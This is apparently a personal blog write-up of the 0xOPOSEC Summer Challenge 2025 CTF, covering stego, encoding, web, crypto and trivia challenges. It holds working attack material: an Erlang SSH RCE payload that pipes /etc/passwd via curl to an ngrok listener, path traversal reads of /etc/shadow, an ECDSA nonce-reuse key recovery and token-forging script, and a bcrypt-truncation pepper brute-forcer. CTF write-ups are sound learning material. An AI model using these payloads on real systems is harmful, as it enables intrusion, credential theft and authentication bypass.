---
title: "0xOPOSEC Summer Challenge 2025"
date: 2025-10-01
draft: false
tags:
  - CTF
---

"Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group."

## Misc

### A Delicious Mess

{{< figure src="/oposec_2025/delicious.png" class="post-image" >}}

I downloaded the image and decided to throw it into binwalk to see if it had anything hidden. Good call, because binwalk revealed there was another image tucked inside the original one.

{{< figure src="/oposec_2025/delicious2.png" class="post-image" >}}

The file name was `12s.jpg`, which felt like a clue. I figured it probably meant I needed to extract it 12 times. After repeating the process 12 times, the flag finally popped out.

{{< figure src="/oposec_2025/delicious3.png" class="post-image" >}}

```bash
flag{are_u_full_y3t?}
```

### Matryoshka

{{< figure src="/oposec_2025/matry.png" class="post-image" >}}

The challenge gave us an URL, which redirected to a webserver spitting out a sequence of hex values.

{{< figure src="/oposec_2025/matry2.png" class="post-image" >}}

I tossed it into cyberchef and ran the magic recipe. With `from_hex('space').gunzip()`, the output looked like `brainfuck` code.

{{< figure src="/oposec_2025/matry3.png" class="post-image" >}}

Using that same recipe, I confirmed it was indeed Brainfuck. I saved the output and ran it through an online brainfuck interpreter, which gave me the next layer.

{{< figure src="/oposec_2025/matry4.png" class="post-image" >}}

{{< figure src="/oposec_2025/matry5.png" class="post-image" >}}

After a bit of googling, I realized it was `obfuscated JavaScript`. I ran it through an online JS interpreter and got yet another doll.

{{< figure src="/oposec_2025/matry6.png" class="post-image" >}}

This time it was `uuencoded`, so I threw it into an online decoder‚Äîand that finally revealed the flag.

{{< figure src="/oposec_2025/matry7.png" class="post-image" >}}

```bash
flag{Babushka!}
```

### Foreplay

{{< figure src="/oposec_2025/foreplay.png" class="post-image" >}}

I ran an nmap against the target range and found port 2222 open:

```bash
$ nmap -Pn -p1024-6667 madlabs.pw -v

PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
```

I then connected with netcat to see what it would do. After a while, I got this back:

```bash
$ nc 20.4.227.104 2222
asd
SSH-2.0-Erlang/5.1.4.7
Protocol mismatch.
```

I googled Erlang with the specific version and found [CVE-2025-32433](https://www.keysight.com/blogs/en/tech/nwvs/2025/05/23/cve-2025-32433-erlang-otp-ssh-server-rce) that contained a simple PoC to abuse this CVE.

Tweaking the payload showed I could call `os:cmd` ‚Äî so instead of `file:write` (original PoC) I tried to use `os:cmd` while listening with `nc -lvnp 8281` + ngrok:

```bash
os:cmd("cat /etc/passwd | curl -X POST --data-binary @- http://ngrok:8281").
```

{{< figure src="/oposec_2025/foreplay2.png" class="post-image" >}}

I validated that `os:cmd` worked, so I went hunting for the flag in `/root`.

{{< figure src="/oposec_2025/foreplay3.png" class="post-image" >}}

{{< figure src="/oposec_2025/foreplay4.png" class="post-image" >}}

```bash
flag{OhBoyErlang}
```

## Web

### The Crew

{{< figure src="/oposec_2025/crew.png" class="post-image" >}}

I opened the site from the challenge and got presented with what looked like `the crew`.

{{< figure src="/oposec_2025/crew2.png" class="post-image" >}}

While poking around with Burp, I immediately spotted a `/flag` directory ‚Äî but visiting it showed an admin-only restriction.

{{< figure src="/oposec_2025/crew3.png" class="post-image" >}}

{{< figure src="/oposec_2025/crew4.png" class="post-image" >}}


Looking in more detail into Burp, I found a `/get_users` endpoint that returned a JSON list of users and their passwords.

{{< figure src="/oposec_2025/crew5.png" class="post-image" >}}

I threw the password list at crackstation and only one matched.

{{< figure src="/oposec_2025/crew6.png" class="post-image" >}}

Using that password to log into the admin panel gave me the flag.

{{< figure src="/oposec_2025/crew7.png" class="post-image" >}}

```bash
flag{why_is_p1zz1_round?}
```

### You Are Not the Admin

{{< figure src="/oposec_2025/admin.png" class="post-image" >}}

Looking at the web page I could easily identify that this was using Next.js

{{< figure src="/oposec_2025/admin2.png" class="post-image" >}}

{{< figure src="/oposec_2025/admin3.png" class="post-image" >}}

I clicked `Go to protected area`, which routed me to `/admin` and immediately redirected to `/login`.

{{< figure src="/oposec_2025/admin4.png" class="post-image" >}}

{{< figure src="/oposec_2025/admin5.png" class="post-image" >}}

I searched for "Next.js auth bypass" and landed on a [Datadog writeup](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/) that looked relevant - one section there jumped out as especially useful:

{{< figure src="/oposec_2025/admin6.png" class="post-image" >}}

So the blog post talks about an api and while checking console logs I noticed that there's an api present.

{{< figure src="/oposec_2025/admin7.png" class="post-image" >}}

Using the PoC available in the blog it's clear that it's possible to bypass the auth mechanism in the login form moving directly into the admin area.

{{< figure src="/oposec_2025/admin8.png" class="post-image" >}}

{{< figure src="/oposec_2025/admin9.png" class="post-image" >}}

Once inside the admin area, the only section that actually did anything was "Settings" ‚Äî it took me to a page that let me read files directly from the server.

{{< figure src="/oposec_2025/admin10.png" class="post-image" >}}

Going for the low-hanging fruit, I tried an LFI attack to grab the flag and ended up with this:

{{< figure src="/oposec_2025/admin11.png" class="post-image" >}}

After a few failed attempts, I switched to a path traversal attack and successfully grabbed `/etc/passwd`:

{{< figure src="/oposec_2025/admin12.png" class="post-image" >}}

After a bit, I realized there were no users besides `root*` ‚Äî with this in mind I checked `/etc/shadow` and that's where the flag was.

{{< figure src="/oposec_2025/admin13.png" class="post-image" >}}

```bash
flag{y0u_d1scov3red_the_P4TH}
```

### Take a Look in the Mirror !

{{< figure src="/oposec_2025/mirror.png" class="post-image" >}}

Exploring the provided URL, I stumbled upon a `/debug` directory that contained what looked like a Java stack trace, including some custom classes.

{{< figure src="/oposec_2025/mirror2.png" class="post-image" >}}

After some Slack hints pointing to Java reflection (Java reflection allows a program to inspect and manipulate classes, methods, and objects at runtime, even if they weren‚Äôt known at compile time) - which fit the challenge name - I realized I could invoke methods directly via the URL by specifying the className.

{{< figure src="/oposec_2025/mirror3.png" class="post-image" >}}

Looking back at the first 500 error in the `/debug` directory, I noticed a comment:

```bash
Exception in controller java.lang: Class c = Class.forName(className); // NormalUser
```

After some testing, I tried calling`http://madlabs.pw:8081/debug?className=com.opolabs.mirror.NormalUser` and got the following response:

{{< figure src="/oposec_2025/mirror4.png" class="post-image" >}}

With that in mind, I figured I might be able to call the same class for the administrator. After trying a few guesses, I found that `AdminUser` was the correct one.

{{< figure src="/oposec_2025/mirror5.png" class="post-image" >}}

```bash
flag{JavaReflectionForTheWin!}
```

## Crypto

### Sounds Frm Another Planet

{{< figure src="/oposec_2025/sounds.png" class="post-image" >}}

After grabbing the encrypted message file, its content contained only the letters `u`, `s`, `d`, and `p`.

{{< figure src="/oposec_2025/sounds2.png" class="post-image" >}}

At first, I thought it was a simple substitution cipher, but I wasn't getting anywhere.

After a few dead ends, I checked out https://dcode.fr/tools-list, which has a handy tool that can help identify the type of cipher.

{{< figure src="/oposec_2025/sounds3.png" class="post-image" >}}

I pasted the encrypted text into the tool, clicked analyze, and it suggested that the text is written in Deadfish.

{{< figure src="/oposec_2025/sounds4.png" class="post-image" >}}

That‚Äôs where I learned that Deadfish isn't really a cipher - it's an extremely simplified programming language with just a single memory cell and four basic operations.

{{< figure src="/oposec_2025/sounds5.png" class="post-image" >}}

By default, Deadfish only uses four letters: `i`, `s`, `d`, and `o`. But the provided message had `u`, `d`, `s`, and `p`, so I had to tweak it a bit.

To convert it into the standard Deadfish format, I applied the following transformations:
- `u` ‚û°Ô∏è `i`
- `d` ‚û°Ô∏è `d`
- `s` ‚û°Ô∏è `s`
- `p` ‚û°Ô∏è `o`

{{< figure src="/oposec_2025/sounds6.png" class="post-image" >}}

With the transformations applied, I pasted the result into the tool, decrypted it, and got the flag.

{{< figure src="/oposec_2025/sounds7.png" class="post-image" >}}

```bash
flag{my_n4m3_15_d3adf1sh}
```

### 2010

{{< figure src="/oposec_2025/date.png" class="post-image" >}}

Navigating to the provided URL, I landed on a page that said the flag would only be given to administrators.

{{< figure src="/oposec_2025/date2.png" class="post-image" >}}

While inspecting the traffic in Burp Suite, I noticed a JWT.

{{< figure src="/oposec_2025/date3.png" class="post-image" >}}

A simple Base64 decode showed that the JWT was a JSON object with two entries: "data" and "signature". Inside "data", there were two fields: "name" and "admin".

{{< figure src="/oposec_2025/date4.png" class="post-image" >}}

I tried changing "admin" from false to true, but that didn‚Äôt grant me admin rights. Another thing I noticed was that every time I pressed F5, the "name" in the JSON object changed, and it updated in the UI as well.

{{< figure src="/oposec_2025/date5.png" class="post-image" >}}

Seeing the challenge name, I suspected this might be an old crypto attack from around 2010. A quick search led me to this: https://github.com/elikaski/ECC_Attacks.

{{< figure src="/oposec_2025/date6.png" class="post-image" >}}

Reading through the GitHub repository, it seems that in 2010 Sony reused the same value of `k` in different ECDSA signatures for the PlayStation, leading to a vulnerability.

The formula to recover the private key when the same k is reused is as follows:

```bash
# k = ((m1 - m2) * modinv(s1 - s2, q)) % q

from Crypto.Util.number import inverse

# NIST P-256 (ECDSA)
q = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551

m1 = token1["message_hash"]
m2 = token2["message_hash"]
s1 = token1["s"]
s2 = token2["s"]
r = token1["r"]

# k
numerator = (m1 - m2) % q
denominator = (s1 - s2) % q
den_inv = inverse(denominator, q)
k = (numerator * den_inv) % q

k -> 115792089210356248762697446949407573529996955224135760342422259061068512044368
```

With some ChatGPT help I got the following resume about this vulnerability:

{{< figure src="/oposec_2025/date7.png" class="post-image" >}}

To solve this, I grabbed two JSON objects with signatures, which allowed me to extract the reused nonce `k` and ultimately recover the private key, assigning it to the variable `x`.

```python
import json
import base64
from hashlib import sha256
from Crypto.Util.number import inverse, bytes_to_long

# NIST P-256 order
q = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551

# Provided JWTs (Base64-encoded)
jwt1_b64 = "eyJkYXRhIjogIntcIm5hbWVcIjogXCJHYXJjaWFcIiwgXCJhZG1pblwiOiBmYWxzZX0iLCAic2lnbmF0dXJlIjogIjZiMTdkMWYyZTEyYzQyNDdmOGJjZTZlNTYzYTQ0MGYyNzcwMzdkODEyZGViMzNhMGY0YTEzOTQ1ZDg5OGMyOTZlMjg1OWViMjFiYWZmZmI5NWRlYjMyMDI3ODE0ODIxZTc3N2FmYzM1YjgxNjJkYmQ5Y2FjYTczNDlmNDcwNzk0In0="
jwt2_b64 = "eyJkYXRhIjogIntcIm5hbWVcIjogXCJHdWVycmVyb1wiLCBcImFkbWluXCI6IGZhbHNlfSIsICJzaWduYXR1cmUiOiAiNmIxN2QxZjJlMTJjNDI0N2Y4YmNlNmU1NjNhNDQwZjI3NzAzN2Q4MTJkZWIzM2EwZjRhMTM5NDVkODk4YzI5NmFkNDc5NDg0Yjk2NDFjNGEzMGY3MTM4NWM5ZDM2NDc2NWRlNzFiMjMwZTVmMDEyNDAwODkwZGUwM2U1OTdmZDAifQ=="

# Decode Base64 and parse JSON
jwt1 = json.loads(base64.b64decode(jwt1_b64))
jwt2 = json.loads(base64.b64decode(jwt2_b64))

# Function to convert signature hex to r and s
def sig_to_rs(sig_hex):
    sig_bytes = bytes.fromhex(sig_hex)
    r = bytes_to_long(sig_bytes[:32])
    s = bytes_to_long(sig_bytes[32:])
    return r, s

r1, s1 = sig_to_rs(jwt1["signature"])
r2, s2 = sig_to_rs(jwt2["signature"])

# Hash the "data" fields using SHA-256
m1 = int(sha256(jwt1["data"].encode()).hexdigest(), 16)
m2 = int(sha256(jwt2["data"].encode()).hexdigest(), 16)

# Compute k using the reused nonce formula
numerator = (m1 - m2) % q
denominator = (s1 - s2) % q
k = (numerator * inverse(denominator, q)) % q
print("Recovered k:", k)

# Recover private key x
x = ((s1 * k - m1) * inverse(r1, q)) % q
print("Recovered private key x:", x)
```

Executing the script got the following result:

```bash
$ python3 extract_priv_key.py                                                                                                                                                                                
Recovered k: 115792089210356248762697446949407573529996955224135760342422259061068512044368
Recovered private key x: 102833336941926514149702482123358695820533145036475158825316379479287364480376 
```

Using the recovered private key, I put together a Python script to generate a valid JWT by signing it with the reused `x`.

```python
import json
import base64
from hashlib import sha256
from ecdsa import SigningKey, NIST256p
from ecdsa.util import sigencode_string

# private key
x = 102833336941926514149702482123358695820533145036475158825316379479287364480376

data = '{"name": "Lyons", "admin": true}'

sk = SigningKey.from_secret_exponent(x, curve=NIST256p, hashfunc=sha256)
sig = sk.sign(data.encode(), hashfunc=sha256, sigencode=sigencode_string)

r = int.from_bytes(sig[:32], 'big')
s = int.from_bytes(sig[32:], 'big')
signature_hex = f"{r:064x}{s:064x}"

token = {
    "data": data,
    "signature": signature_hex
}

token_b64 = base64.b64encode(json.dumps(token).encode()).decode()
print(token_b64)
```

Executing the script got the following result:

```bash
$ python3 exploit.py                                                                                                                                                                                
eyJkYXRhIjogIntcIm5hbWVcIjogXCJMeW9uc1wiLCBcImFkbWluXCI6IHRydWV9IiwgInNpZ25hdHVyZSI6ICJmZTNlZWI3Zjc5NDY5YTJjYWQ0YTI0ODI3NjI4ODhhNTZjYTNmZDI1OTJmOWU2MmUyMDBkMzdkMjNlMTVkY2ZkYmRiNWQzMzdlNTVkYT
ZmYzhlZDBhM2QxYWQwYWE5YWMzZTBiNGI0NjU0YzdkNjQ0ZTRkYjJkMGQ2MTQ4ZWQzOCJ9
```

I tweaked the JWT in the web app, and that got me the flag.

{{< figure src="/oposec_2025/date8.png" class="post-image" >}}

```bash
flag{if_not_rand0m_why_rand0m_sh4ped?}
```


### Spicy

{{< figure src="/oposec_2025/spicy.png" class="post-image" >}}

The URL led to a web app where I could either log in or register.

{{< figure src="/oposec_2025/spicy2.png" class="post-image" >}}

I went ahead and created an account to log in.

{{< figure src="/oposec_2025/spicy3.png" class="post-image" >}}

{{< figure src="/oposec_2025/spicy4.png" class="post-image" >}}

Right after logging in, I navigated to /flag and an admin panel appeared with an input field for a "Magic Key".

{{< figure src="/oposec_2025/spicy5.png" class="post-image" >}}

I started fuzzing the web app with FFUF and discovered a `/backup` folder.

{{< figure src="/oposec_2025/spicy6.png" class="post-image" >}}

I used `wget` to download a file that appeared to be a zip archive.

{{< figure src="/oposec_2025/spicy7.png" class="post-image" >}}

Once extracted, the zip revealed what looked like the source code of the web application being used in the challenge.

{{< figure src="/oposec_2025/spicy8.png" class="post-image" >}}

The code had a lot of rabbit holes, but after some digging, I found that the web application uses bcrypt and combines the user password with the magic key.

{{< figure src="/oposec_2025/spicy9.png" class="post-image" >}}

Reading [bcrypt documentation](https://github.com/pyca/bcrypt/) i've noticed this:

{{< figure src="/oposec_2025/spicy10.png" class="post-image" >}}

If I create a password with 72 characters, I can log in using that password plus extra stuff. But the code shows that a `PEPPER` is added before hashing, so `bcrypt_hash(password + PEPPER)` effectively becomes `bcrypt_hash("A" * 72 + MAGIC_KEY)`, which means the `MAGIC_KEY` gets ignored.

To confirm, I used Burp Suite to brute-force the login with my account, testing a password of 71 As followed by `[a-zA-Z0-9]`. I successfully logged in with 71 As + `e`, revealing that the first character is `e`.

{{< figure src="/oposec_2025/spicy11.png" class="post-image" >}}

The steps to recover the PEPPER are:
- Create an account using a password of 71 characters.
- Attempt to log in with that password plus an extra character:
  - If it succeeds, that character is part of the PEPPER.
  - If it fails, try a different character until it works.
- Once logged in, change the current password from 71 characters to 70 characters.
- Repeat the login attempts using the previous password + known PEPPER characters + a new character.
- Continue this process until all characters of the PEPPER are discovered.

I wrote a Python script to automate these steps, making the process of discovering the PEPPER much simpler and faster.

```python
import requests
from string import ascii_letters, digits

URL = "https://spicy.0d.al"
USERNAME = "nnn"

session = requests.Session()
CHARSET = ascii_letters + digits

def login(password: str) -> bool:
    r = session.post(f"{URL}/login/", data={
        "username": USERNAME,
        "password": password,
    }, allow_redirects=False)
    return r.status_code in (302, 303)

def change_password(old_password: str, new_password: str) -> bool:
    r = session.post(f"{URL}/password_change/", data={
        "old_password": old_password,
        "new_password1": new_password,
        "new_password2": new_password,
    }, allow_redirects=False)
    return r.status_code in (302, 303)

def recover_pepper():
    pepper = ""
    num_b_prefix = 71

    current_server_password = "B" * 71

    if not login(current_server_password):
        print("[-] Error - login")
        return ""

    while num_b_prefix >= 0:
        found_char = None

        prefix = "B" * num_b_prefix

        for c in CHARSET:
            test_password = prefix + pepper + c

            if len(test_password) != 72:
                continue

            print(f"[>] Trying login: {test_password}")

            if login(test_password):
                # Ok we have found the next valid char for Pepper
                print(f"[‚úì] Char found: '{c}'")
                found_char = c
                break

        if found_char:
            pepper += found_char

            # We decrement the prefix to find the new Pepper's char
            new_pw = "B" * (num_b_prefix - 1)

            if change_password(current_server_password, new_pw):
                print(f"[+] Password changed to: {new_pw}")
                current_server_password = new_pw
                num_b_prefix -= 1
            else:
                print("[-] Error while changing password")
                return pepper
        else:
            print("[!] No char was found")
            break
    return pepper

if __name__ == "__main__":
    recovered_pepper = recover_pepper()
    print(f"Pepper: {recovered_pepper}")
```

I then executed the script and found the `PEPPER` to be `e8isahBivzaZ39zOTG0`

{{< figure src="/oposec_2025/spicy12.png" class="post-image" >}}

With this `PEPPER` I was able to provide the "Magic Key" and get the flag.

{{< figure src="/oposec_2025/spicy13.png" class="post-image" >}}

```bash
flag{D0nt_CrY_0v3R_S9ill3d_P3pper}
```

## Trivia

### Default

{{< figure src="/oposec_2025/default.png" class="post-image" >}}

I spent a lot of time Googling different things to solve this challenge ... eventually, I decided to check who actually took the picture.

{{< figure src="/oposec_2025/default2.png" class="post-image" >}}

I used "Bliss" as the flag, and it worked.

```bash
flag{Bliss}
```

### The One

{{< figure src="/oposec_2025/theone.png" class="post-image" >}}

<audio controls class="">
  <source src="/oposec_2025/boot.mp3" type="audio/mpeg">
</audio>


We got a sound that resembled something old powering on.

After a bit of digging (and some YouTube videos), I realized it was the PlayStation 1 startup sound - but that still wasn‚Äôt the flag.

Then I paused to think‚Äîthe phrase *"what makes me tick"* was in bold, so it seemed like a hint for the flag. I asked ChatGPT for guidance, and it suggested the following:

{{< figure src="/oposec_2025/theone2.png" class="post-image" >}}

Googling the PlayStation 1 CPU model, I discovered that it uses the **MIPS R3000A-compatible 32-bit RISC** processor.

Using `R3000` as the flag it worked!


```bash
flag{R3000}
```

### A Sweet Evolution

{{< figure src="/oposec_2025/evol.png" class="post-image" >}}

The final challenge was quite tough for me - I spent several hours on it. I tried multiple approaches to see what would make sense, and eventually I concluded that the solution might involve assigning a word to each image and then taking the first letter of each word

- `S`kittles
- `K`itkat
- `?`
- `M`arshmallows

After mapping a word to each image and taking the first letter, I immediately noticed that the letters formed the alphabet, with the missing letter being `L`.

Since these images referred to sweet candies, I thought of a candy starting with `L` and used **Lollipop** as the answer.

```bash
flag{Lollipop}
```

## Conclusion

This year I managed to finish all the challenges, though I didn't make it to the podium üòÖ. Ending up in 5th place isn't too bad! Already excited for the Christmas Challenge 2025!

{{< figure src="/oposec_2025/conclusion.png" class="post-image" >}}